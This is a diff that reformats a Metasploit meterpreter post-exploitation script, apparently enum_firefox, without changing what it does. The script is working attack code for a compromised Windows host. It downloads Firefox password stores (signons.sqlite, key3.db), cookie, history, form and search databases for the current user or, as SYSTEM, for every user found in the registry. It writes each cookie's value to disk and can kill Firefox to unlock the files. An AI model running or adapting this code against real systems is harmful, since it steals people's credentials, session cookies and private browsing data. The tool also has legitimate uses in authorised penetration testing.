@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 #
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
@@ -12,12 +12,13 @@
 require 'sqlite3'
 @client = client
 kill_frfx = false
-host,port = session.session_host, session.session_port
+host = session.session_host
+port = session.session_port
 # Create Filename info to be appended to downloaded files
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
 # Create a directory for the logs
-@logs = ::File.join(Msf::Config.config_directory, 'logs',"scripts", 'enum_firefox', host + filenameinfo )
+@logs = ::File.join(Msf::Config.config_directory, 'logs', "scripts", 'enum_firefox', host + filenameinfo)
 
 # logfile name
 logfile = @logs + "/" + host + filenameinfo + ".txt"
@@ -30,26 +31,26 @@ notusrs = [
   "All Users"
 ]
 #-------------------------------------------------------------------------------
-#Function for getting Firefox SQLite DB's
-def frfxplacesget(path,usrnm)
+# Function for getting Firefox SQLite DB's
+def frfxplacesget(path, usrnm)
   # Create the log
   ::FileUtils.mkdir_p(@logs)
-  @client.fs.dir.foreach(path) {|x|
+  @client.fs.dir.foreach(path) do |x|
     next if x =~ /^(\.|\.\.)$/
     fullpath = path + '\\' + x
     if @client.fs.file.stat(fullpath).directory?
-      frfxplacesget(fullpath,usrnm)
+      frfxplacesget(fullpath, usrnm)
     elsif fullpath =~ /(formhistory.sqlite|cookies.sqlite|places.sqlite|search.sqlite)/i
       dst = x
       dst = @logs + ::File::Separator + usrnm + dst
       print_status("\tDownloading Firefox Database file #{x} to '#{dst}'")
       @client.fs.file.download_file(dst, fullpath)
     end
-  }
-
+  end
 end
+
 #-------------------------------------------------------------------------------
-#Function for processing the Firefox sqlite DB's
+# Function for processing the Firefox sqlite DB's
 def frfxdmp(usrnm)
   sitesvisited = []
   dnldsmade = []
@@ -70,106 +71,106 @@ def frfxdmp(usrnm)
   begin
     print_status("\tGetting Firefox Bookmarks for #{usrnm}")
     db = SQLite3::Database.new(placesdb)
-    #print_status("\tProcessing #{placesdb}")
+    # print_status("\tProcessing #{placesdb}")
 
-    db.execute('select a.url from moz_places a, moz_bookmarks b, '+
-      'moz_bookmarks_roots c where a.id=b.fk and parent=2'+
+    db.execute('select a.url from moz_places a, moz_bookmarks b, '\
+      'moz_bookmarks_roots c where a.id=b.fk and parent=2'\
       ' and folder_id=2 and a.hidden=0') do |row|
       bkmrks << row
     end
     print_status("\tSaving to #{bookmarks}")
-    if bkmrks.length != 0
+    if !bkmrks.empty?
       bkmrks.each do |b|
-        file_local_write(bookmarks,"\t#{b.to_s}\n")
+        file_local_write(bookmarks, "\t#{b}\n")
       end
     else
       print_status("\tIt appears that there are no bookmarks for this account")
     end
-  rescue::Exception => e
+  rescue ::Exception => e
     print_status("The following Error was encountered: #{e.class} #{e}")
   end
   #--------------------------------------------------------------------------
   begin
     print_status("\tGetting list of Downloads using Firefox made by #{usrnm}")
-    db.execute('SELECT url FROM moz_places, moz_historyvisits ' +
-      'WHERE moz_places.id = moz_historyvisits.place_id '+
+    db.execute('SELECT url FROM moz_places, moz_historyvisits ' \
+      'WHERE moz_places.id = moz_historyvisits.place_id '\
       'AND visit_type = "7" ORDER by visit_date') do |row|
       dnldsmade << row
     end
     print_status("\tSaving Download list to #{download_list}")
-    if dnldsmade.length != 0
+    if !dnldsmade.empty?
       dnldsmade.each do |d|
-        file_local_write(download_list,"\t#{d.to_s} \n")
+        file_local_write(download_list, "\t#{d} \n")
       end
     else
       print_status("\tIt appears that downloads where cleared for this account")
     end
-  rescue::Exception => e
+  rescue ::Exception => e
     print_status("The following Error was encountered: #{e.class} #{e}")
   end
   #--------------------------------------------------------------------------
   begin
     print_status("\tGetting Firefox URL History for #{usrnm}")
-    db.execute('SELECT DISTINCT url FROM moz_places, moz_historyvisits ' +
-      'WHERE moz_places.id = moz_historyvisits.place_id ' +
-      'AND visit_type = "1" ORDER by visit_date' ) do |row|
+    db.execute('SELECT DISTINCT url FROM moz_places, moz_historyvisits ' \
+      'WHERE moz_places.id = moz_historyvisits.place_id ' \
+      'AND visit_type = "1" ORDER by visit_date') do |row|
       sitesvisited << row
     end
     print_status("\tSaving URL History to #{url_history}")
-    if sitesvisited.length != 0
+    if !sitesvisited.empty?
       sitesvisited.each do |s|
-        file_local_write(url_history,"\t#{s.to_s}\n")
+        file_local_write(url_history, "\t#{s}\n")
       end
     else
       print_status("\tIt appears that Browser History has been cleared")
     end
     db.close
-  rescue::Exception => e
+  rescue ::Exception => e
     print_status("The following Error was encountered: #{e.class} #{e}")
   end
   #--------------------------------------------------------------------------
   begin
     print_status("\tGetting Firefox Form History for #{usrnm}")
     db = SQLite3::Database.new(formdb)
-    #print_status("\tProcessing #{formdb}")
+    # print_status("\tProcessing #{formdb}")
     db.execute("SELECT fieldname,value FROM moz_formhistory") do |row|
       formvals << "\tField: #{row[0]} Value: #{row[1]}\n"
     end
     print_status("\tSaving Firefox Form History to #{form_history}")
-    if formvals.length != 0
-      file_local_write(form_history,formvals)
+    if !formvals.empty?
+      file_local_write(form_history, formvals)
     else
       print_status("\tIt appears that Form History has been cleared")
     end
     db.close
-  rescue::Exception => e
+  rescue ::Exception => e
     print_status("The following Error was encountered: #{e.class} #{e}")
   end
 
   begin
     print_status("\tGetting Firefox Search History for #{usrnm}")
     db = SQLite3::Database.new(searchdb)
-    #print_status("\tProcessing #{searchdb}")
+    # print_status("\tProcessing #{searchdb}")
     db.execute("SELECT name,value FROM engine_data") do |row|
       searches << "\tField: #{row[0]} Value: #{row[1]}\n"
     end
     print_status("\tSaving Firefox Search History to #{search_history}")
-    if searches.length != 0
-      file_local_write(search_history,searches)
+    if !searches.empty?
+      file_local_write(search_history, searches)
     else
       print_status("\tIt appears that Search History has been cleared")
     end
     db.close
-  rescue::Exception => e
+  rescue ::Exception => e
     print_status("The following Error was encountered: #{e.class} #{e}")
   end
   # Create Directory for dumping Firefox cookies
-  ckfldr = ::File.join(@logs,"firefoxcookies_#{usrnm}")
+  ckfldr = ::File.join(@logs, "firefoxcookies_#{usrnm}")
   ::FileUtils.mkdir_p(ckfldr)
   db = SQLite3::Database.new(cookiesdb)
   db.results_as_hash = true
   print_status("\tGetting Firefox Cookies for #{usrnm}")
-  db.execute("SELECT * FROM moz_cookies;" ) do |item|
+  db.execute("SELECT * FROM moz_cookies;") do |item|
     fd = ::File.new(ckfldr + ::File::Separator + item['id'].to_s + "_" + item['host'].to_s + ".txt", "w+")
     fd.puts "Name: " + item['name'] + "\n"
     fd.puts "Value: " + item['value'].to_s + "\n"
@@ -181,17 +182,18 @@ def frfxdmp(usrnm)
     fd.puts "isHttpOnly: " + item['isHttpOnly'].to_s + "\n"
     fd.close
   end
-  return results
+  results
 end
+
 #-------------------------------------------------------------------------------
-#Function for getting password files
-def frfxpswd(path,usrnm)
-  @client.fs.dir.foreach(path) {|x|
+# Function for getting password files
+def frfxpswd(path, usrnm)
+  @client.fs.dir.foreach(path) do |x|
     next if x =~ /^(\.|\.\.)$/
     fullpath = path + '\\' + x
 
     if @client.fs.file.stat(fullpath).directory?
-      frfxpswd(fullpath,usrnm)
+      frfxpswd(fullpath, usrnm)
     elsif fullpath =~ /(cert8.db|signons.sqlite|signons3.txt|key3.db)/i
       begin
         dst = x
@@ -203,9 +205,9 @@ def frfxpswd(path,usrnm)
         print_error("\t******Browser could be running******")
       end
     end
-  }
-
+  end
 end
+
 #-------------------------------------------------------------------------------
 # Function for checking if Firefox is installed
 def frfxchk
@@ -216,26 +218,26 @@ def frfxchk
       found = true
     end
   end
-  return found
+  found
 end
+
 #-------------------------------------------------------------------------------
-#Function for executing all pilfering actions for Firefox
-def frfxpilfer(frfoxdbloc,session,logs,usrnm,logfile)
+# Function for executing all pilfering actions for Firefox
+def frfxpilfer(frfoxdbloc, _session, _logs, usrnm, logfile)
   print_status("Getting Firefox information for user #{usrnm}")
-  frfxplacesget(frfoxdbloc,usrnm)
-  frfxpswd(frfoxdbloc,usrnm)
-  file_local_write(logfile,frfxdmp(usrnm))
+  frfxplacesget(frfoxdbloc, usrnm)
+  frfxpswd(frfoxdbloc, usrnm)
+  file_local_write(logfile, frfxdmp(usrnm))
 end
 
 # Function to kill Firefox if open
 def kill_firefox
   print_status("Killing the Firefox Process if open...")
-  @client.sys.process.get_processes().each do |x|
-    if x['name'].downcase == "firefox.exe"
-      print_status("\tFirefox Process found #{x['name']} #{x['pid']}")
-      print_status("\tKilling process .....")
-      session.sys.process.kill(x['pid'])
-    end
+  @client.sys.process.get_processes.each do |x|
+    next unless x['name'].casecmp("firefox.exe").zero?
+    print_status("\tFirefox Process found #{x['name']} #{x['pid']}")
+    print_status("\tKilling process .....")
+    session.sys.process.kill(x['pid'])
   end
 end
 ####################### Options ###########################
@@ -244,7 +246,7 @@ end
   "-k" => [ false, "Kill Firefox processes before downloading databases for enumeration."]
 
 )
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, _val|
   case opt
   when "-h"
     print_line "Meterpreter Script for extracting Firefox Browser."
@@ -253,35 +255,30 @@ end
   when "-k"
     kill_frfx = true
   end
-}
+end
 if client.platform =~ /win32|win64/
   if frfxchk
     user = @client.sys.config.getuid
-    if not is_system?
+    if !is_system?
       envs = @client.sys.config.getenvs('USERNAME', 'APPDATA')
       usrname = envs['USERNAME']
       db_path = envs['APPDATA'] + "\\Mozilla\\Firefox\\Profiles"
-      if kill_frfx
-        kill_firefox
-      end
+      kill_firefox if kill_frfx
       print_status("Extracting Firefox data for user #{usrname}")
-      frfxpswd(db_path,usrname)
-      frfxplacesget(db_path,usrname)
+      frfxpswd(db_path, usrname)
+      frfxplacesget(db_path, usrname)
       frfxdmp(usrname)
     else
       registry_enumkeys("HKU").each do |sid|
-        if sid =~ /S-1-5-21-\d*-\d*-\d*-\d{4}$/
-          key_base = "HKU\\#{sid}"
-          usrname = Rex::FileUtils.clean_path(registry_getvaldata("#{key_base}\\Volatile Environment","USERNAME"))
-          db_path = registry_getvaldata("#{key_base}\\Volatile Environment","APPDATA") + "\\Mozilla\\Firefox\\Profiles"
-          if kill_frfx
-            kill_firefox
-          end
-          print_status("Extracting Firefox data for user #{usrname}")
-          frfxpswd(db_path,usrname)
-          frfxplacesget(db_path,usrname)
-          frfxdmp(usrname)
-        end
+        next unless sid =~ /S-1-5-21-\d*-\d*-\d*-\d{4}$/
+        key_base = "HKU\\#{sid}"
+        usrname = Rex::FileUtils.clean_path(registry_getvaldata("#{key_base}\\Volatile Environment", "USERNAME"))
+        db_path = registry_getvaldata("#{key_base}\\Volatile Environment", "APPDATA") + "\\Mozilla\\Firefox\\Profiles"
+        kill_firefox if kill_frfx
+        print_status("Extracting Firefox data for user #{usrname}")
+        frfxpswd(db_path, usrname)
+        frfxplacesget(db_path, usrname)
+        frfxdmp(usrname)
       end
     end
 
